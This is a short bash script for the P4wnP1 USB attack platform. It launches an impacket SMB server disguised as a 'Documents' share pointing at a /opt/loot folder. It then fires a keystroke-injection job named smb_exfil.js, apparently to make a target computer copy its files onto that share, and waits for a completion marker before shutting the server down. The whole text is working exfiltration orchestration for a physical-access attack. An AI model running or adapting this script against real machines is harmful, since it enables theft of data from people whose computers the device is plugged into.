#!/bin/bash
# Place this file in the scripts directory

rm "/opt/loot/done" -f
# clean redundant file if any
P4wnP1_cli led -b 1
python3 /opt/impacket/examples/smbserver.py -comment "Documents" -smb2support e /opt/loot &
sleep 2
P4wnP1_cli led -b 25
P4wnP1_cli hid job smb_exfil.js
while [ ! -f "/opt/loot/done" ];do sleep 1;done
# wait until the "done" file is created
kill `ps ax | grep impacket | grep -v grep | grep -Po "\s+\d+\s"`
rm "/opt/loot/done" -f
P4wnP1_cli led -b 0
